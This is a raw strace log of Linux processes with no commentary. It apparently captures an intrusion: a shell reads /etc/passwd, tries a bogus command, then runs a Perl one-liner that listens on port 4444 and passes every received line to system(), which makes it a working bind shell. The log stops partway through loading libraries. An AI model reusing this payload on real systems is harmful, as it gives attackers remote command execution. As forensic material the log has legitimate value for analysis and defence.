6690  07:15:04.912388 fstat64(1, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
6690  07:15:04.912405 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fc2000
6690  07:15:04.912416 read(1, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
6690  07:15:04.912465 read(1, "", 4096) = 0
6690  07:15:04.912475 close(1)          = 0
6690  07:15:04.912484 munmap(0xb7fc2000, 4096) = 0
6690  07:15:04.912531 open("/etc/ld.so.cache", O_RDONLY) = 1
6690  07:15:04.912563 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
6690  07:15:04.912580 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7fbb000
6690  07:15:04.912590 close(1)          = 0
6690  07:15:04.912601 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6690  07:15:04.912616 open("/lib/tls/i686/cmov/libnss_compat.so.2", O_RDONLY) = 1
6690  07:15:04.912631 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@\16\0\0004\0\0\0\204r\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0001a\0\0001a\0\0001a\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274c\0\0\274c\0\0\5\0\0\0\0\20\0\0\1\0\0\0\340n\0\0\340~\0\0\340~\0\0\250\2\0\0h\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\364n\0\0\364~\0\0\364~\0\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\340n\0\0\340~\0\0\340~\0\0\24\1\0\0\24\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\32\0\0\0&\0\0\0\4\0\0\0\7\0\0\0Q\0\200\2@\t\21\r\0\4\33\200\21H\262\201&\0\0\0\'\0\0\0(\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0)\0\0\0*\0\0\0+\0\0\0\0\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0\0\0\0\0\0\0\0\0002\0\0\0\0\0\0\0003\0\0\0004\0\0\0\0\0\0\0005\0\0\0\207[\246\22\365\33=\274\365\365K\23\0012\310%;]^\2674\10\301\346\357\37>\346\312\271\330\2749\303M%", 512) = 512
6690  07:15:04.912775 fstat64(1, {st_mode=S_IFREG|0644, st_size=30436, ...}) = 0
6690  07:15:04.912794 mmap2(NULL, 33352, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e2d000
6690  07:15:04.912806 mmap2(0xb7e34000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x6) = 0xb7e34000
6690  07:15:04.912823 close(1)          = 0
6690  07:15:04.912835 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6690  07:15:04.912849 open("/lib/tls/i686/cmov/libnsl.so.1", O_RDONLY) = 1
6690  07:15:04.912863 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\00001\0\0004\0\0\0\234B\1\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340,\1\0\340,\1\0\340,\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\3407\1\0\3407\1\0\5\0\0\0\0\20\0\0\1\0\0\0\300>\1\0\300N\1\0\300N\1\0\350\2\0\0()\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\300>\1\0\300N\1\0\300N\1\0004\1\0\0004\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\374\0\0\0q\0\0\0 \0\0\0\n\0\0\0\1\1$\232 \'Q\0@ \0\0\f\1\1\n\1\n\0\0\240:X\0@\1\16$\10\4\200\n`\260\23 @\24\21\20@\3442\324\4H\346\0\1`\3@\260\272\2019\30\235\340\0\0\332\200\0044\2\201J\20{\203+\200\22 d\21\1\0\2\200\306 d`A\n\4\4\4\v\4PD@\200\20\0\22 \4\340@\1\32 \4\2\20\10\0\0\204\260\200\0\340\23\0\212$\0\206\210\0\2`@q\0\0\0\0\0\0\0\0\0\0\0r\0\0\0\0\0\0\0t\0\0\0\0\0\0\0", 512) = 512
6690  07:15:04.912950 fstat64(1, {st_mode=S_IFREG|0644, st_size=83708, ...}) = 0
6690  07:15:04.912967 mmap2(NULL, 96232, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e15000
6690  07:15:04.912979 mmap2(0xb7e29000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7e29000
6690  07:15:04.912994 mmap2(0xb7e2b000, 6120, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7e2b000
6690  07:15:04.913037 close(1)          = 0
6690  07:15:04.913081 munmap(0xb7fbb000, 29913) = 0
6690  07:15:04.913098 open("/etc/ld.so.cache", O_RDONLY) = 1
6690  07:15:04.913110 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
6690  07:15:04.913127 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7fbb000
6690  07:15:04.913137 close(1)          = 0
6690  07:15:04.913148 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6690  07:15:04.913162 open("/lib/tls/i686/cmov/libnss_nis.so.2", O_RDONLY) = 1
6690  07:15:04.913177 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20\31\0\0004\0\0\0\320\201\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\350x\0\0\350x\0\0\350x\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\310}\0\0\310}\0\0\5\0\0\0\0\20\0\0\1\0\0\0\334~\0\0\334\216\0\0\334\216\0\0\374\1\0\0`\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360~\0\0\360\216\0\0\360\216\0\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334~\0\0\334\216\0\0\334\216\0\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0g\0\0\0000\0\0\0\20\0\0\0\t\0\0\0\2\0\0H  \26\20\0\0@g\3\0\3\6\30\24\0248A\30&\243\301\200\212\0048\21\10 B@\310\24\344\20\311\244\10\0\4\0\0@\0P!\0\0\204\0\0\0\0@\v\0y\243\0D\202\0\0\0\0000\0\0\0001\0\0\0\0\0\0\0002\0\0\0003\0\0\0004\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0005\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0006\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
6690  07:15:04.913266 fstat64(1, {st_mode=S_IFREG|0644, st_size=34352, ...}) = 0
6690  07:15:04.913287 mmap2(NULL, 37436, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e0b000
6690  07:15:04.913299 mmap2(0xb7e13000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x7) = 0xb7e13000
6690  07:15:04.913315 close(1)          = 0
6690  07:15:04.913327 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6690  07:15:04.913340 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 1
6690  07:15:04.913355 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
6690  07:15:04.913444 fstat64(1, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
6690  07:15:04.913461 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e00000
6690  07:15:04.913473 mmap2(0xb7e09000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7e09000
6690  07:15:04.913489 close(1)          = 0
6690  07:15:04.913554 munmap(0xb7fbb000, 29913) = 0
6690  07:15:04.913571 open("/etc/passwd", O_RDONLY|0x80000 /* O_??? */) = 1
6690  07:15:04.913586 fcntl64(1, F_GETFD) = 0x1 (flags FD_CLOEXEC)
6690  07:15:04.913598 _llseek(1, 0, [0], SEEK_CUR) = 0
6690  07:15:04.913610 fstat64(1, {st_mode=S_IFREG|0644, st_size=1624, ...}) = 0
6690  07:15:04.913626 mmap2(NULL, 1624, PROT_READ, MAP_SHARED, 1, 0) = 0xb7fc2000
6690  07:15:04.913637 _llseek(1, 1624, [1624], SEEK_SET) = 0
6690  07:15:04.913652 munmap(0xb7fc2000, 1624) = 0
6690  07:15:04.913662 close(1)          = 0
6690  07:15:04.913691 getpgrp()         = 3831
6690  07:15:04.913701 rt_sigaction(SIGCHLD, {0x807e540, [], 0}, {SIG_DFL}, 8) = 0
6690  07:15:04.913716 getrlimit(RLIMIT_NPROC, {rlim_cur=8191, rlim_max=8191}) = 0
6690  07:15:04.913732 brk(0x8101000)    = 0x8101000
6690  07:15:04.913763 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
6690  07:15:04.913778 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
6690  07:15:04.913793 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
6690  07:15:04.913830 brk(0x8102000)    = 0x8102000
6690  07:15:04.913857 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
6690  07:15:04.913876 stat64("/sbin/AB", 0xbfcb9b08) = -1 ENOENT (No such file or directory)
6690  07:15:04.913889 stat64("/bin/AB", 0xbfcb9b08) = -1 ENOENT (No such file or directory)
6690  07:15:04.913900 stat64("/usr/sbin/AB", 0xbfcb9b08) = -1 ENOENT (No such file or directory)
6690  07:15:04.913912 stat64("/usr/bin/AB", 0xbfcb9b08) = -1 ENOENT (No such file or directory)
6690  07:15:04.913925 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
6690  07:15:04.913939 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7e366f8) = 6691
6691  07:15:04.913985 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
6691  07:15:04.914030 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
6691  07:15:04.914060 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
6691  07:15:04.914072 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
6691  07:15:04.914087 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
6691  07:15:04.914107 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
6691  07:15:04.914121 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
6691  07:15:04.914176 write(2, "sh: AB: command not found\n", 26) = -1 EPIPE (Broken pipe)
6691  07:15:04.914190 --- SIGPIPE (Broken pipe) @ 0 (0) ---
6691  07:15:04.914258 exit_group(127)   = ?
6690  07:15:04.939608 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
4519  07:15:04.939635 waitpid(6690,  <unfinished ...>
6690  07:15:04.939646 <... rt_sigprocmask resumed> NULL, 8) = 0
6690  07:15:04.939653 --- SIGCHLD (Child exited) @ 0 (0) ---
6690  07:15:04.939668 waitpid(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 127}], WNOHANG) = 6691
6690  07:15:04.939685 waitpid(-1, 0xbfcb9788, WNOHANG) = -1 ECHILD (No child processes)
6690  07:15:04.939697 sigreturn()       = ? (mask now [])
6690  07:15:04.939720 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
6690  07:15:04.939735 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
6690  07:15:04.939746 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
6690  07:15:04.939759 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
6690  07:15:04.939787 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
6690  07:15:04.939800 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
6690  07:15:04.939837 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
6690  07:15:04.939857 stat64("/sbin/perl", 0xbfcb9b38) = -1 ENOENT (No such file or directory)
6690  07:15:04.939870 stat64("/bin/perl", 0xbfcb9b38) = -1 ENOENT (No such file or directory)
6690  07:15:04.939882 stat64("/usr/sbin/perl", 0xbfcb9b38) = -1 ENOENT (No such file or directory)
6690  07:15:04.939894 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
6690  07:15:04.939912 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
6690  07:15:04.939947 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
6690  07:15:04.939963 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7e366f8) = 6692
6692  07:15:04.940015 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
6692  07:15:04.940032 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
6692  07:15:04.940045 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
6692  07:15:04.940057 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
6692  07:15:04.940072 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
6692  07:15:04.940087 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
6692  07:15:04.940100 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
6692  07:15:04.940136 execve("/usr/bin/perl", ["perl", "-MIO", "-e", "$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};"], [/* 14 vars */]) = 0
6692  07:15:04.940226 brk(0)            = 0x8153000
6692  07:15:04.940248 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6692  07:15:04.940264 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fdf000
6692  07:15:04.940324 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
6692  07:15:04.940344 open("/etc/ld.so.cache", O_RDONLY) = 1
6692  07:15:04.940357 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
6692  07:15:04.940375 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7fd7000
6692  07:15:04.940399 close(1)          = 0
6692  07:15:04.940411 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6692  07:15:04.940426 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
6692  07:15:04.940440 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
6692  07:15:04.940539 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
6692  07:15:04.940557 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7fd3000
6692  07:15:04.940569 mmap2(0xb7fd5000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7fd5000
6692  07:15:04.940585 close(1)          = 0
6692  07:15:04.940596 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6692  07:15:04.940610 open("/lib/tls/i686/cmov/libm.so.6", O_RDONLY) = 1
6692  07:15:04.940625 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@4\0\0004\0\0\0PB\2\0\0\0\0\0004\0 \0\t\0(\0 \0\37\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0x\20\2\0x\20\2\0x\20\2\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0$/\2\0$/\2\0\5\0\0\0\0\20\0\0\1\0\0\0\334>\2\0\334>\2\0\334>\2\0`\1\0\0\244\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360>\2\0\360>\2\0\360>\2\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\214\20\2\0\214\20\2\0\214\20\2\0\34\4\0\0\34\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334>\2\0\334>\2\0\334>\2\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\214\2\0\0\17\0\0\0@\0\0\0\v\0\0\0%\220 \305\t\204g\v\0\302\20 \4iER\202\20\200\240\0}\210\272\10\10I\0\0\0\0\0\33\4\201\0\0\0\232U\20A P \200\224\202\220\21@\3722\0\304a\24\0\10\6\306\220\232\f\207\300 \250\0  \202\0\230\201\4E\7\0054a\2\0\0\251C\30\310 \10\23\30\24M8\"\0\22\24\21@T\203\2E\1\1\1\244\fX\20\0\210\2\0 \0@\0$\214\5\10", 512) = 512
6692  07:15:04.940713 fstat64(1, {st_mode=S_IFREG|0644, st_size=149328, ...}) = 0
6692  07:15:04.940730 mmap2(NULL, 147584, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7fae000
6692  07:15:04.940741 mmap2(0xb7fd1000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x23) = 0xb7fd1000
6692  07:15:04.940757 close(1)          = 0
6692  07:15:04.940768 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6692  07:15:04.940810 open("/lib/tls/i686/cmov/libpthread.so.0", O_RDONLY) = 1
6692  07:15:04.940826 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20H\0\0004\0\0\0\330C\1\0\0\0\0\0004\0 \0\t\0(\0$\0!\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\224\n\1\0\224\n\1\0\224\n\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4;\1\0\4;\1\0\5\0\0\0\0\20\0\0\1\0\0\0\344=\1\0\344M\1\0\344M\1\0T\3\0\0\374#\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\250\n\1\0\250\n\1\0\250\n\1\0\314\4\0\0\314\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\344=\1\0\344M\1\0\344M\1\0\20\2\0\0\20\2\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\262\1\0\0L\0\0\0@\0\0\0\v\0\0\0\31!\2\221\1\n\20\"@H \331\3\0I4\200\0\0@\0 \200\200\21P`@@\22\213\0020D\0\0\20\0\0\2\0\1\r\0\204\n\360\1X\260\r\240\200\10 $\204\20B\242)m\10G\234V\20\0\224 \204$\10\0H(\1\222\34\301B\240\220\22\10\f \2\30`A\244c\4\0\n\32\3\0\0)\0(\314@\204\210L\22\10\241\0\4\0\10\0\300Q\0\2009\4C\300", 512) = 512
6692  07:15:04.940927 fstat64(1, {st_mode=S_IFREG|0755, st_size=112354, ...}) = 0
6692  07:15:04.940947 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fad000
6692  07:15:04.940960 mmap2(NULL, 94688, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f95000
6692  07:15:04.940971 mmap2(0xb7fa9000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7fa9000
6692  07:15:04.940986 mmap2(0xb7fab000, 4576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7fab000
6692  07:15:04.941000 close(1)          = 0
6692  07:15:04.941011 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
6692  07:15:04.941025 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
6692  07:15:04.941039 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  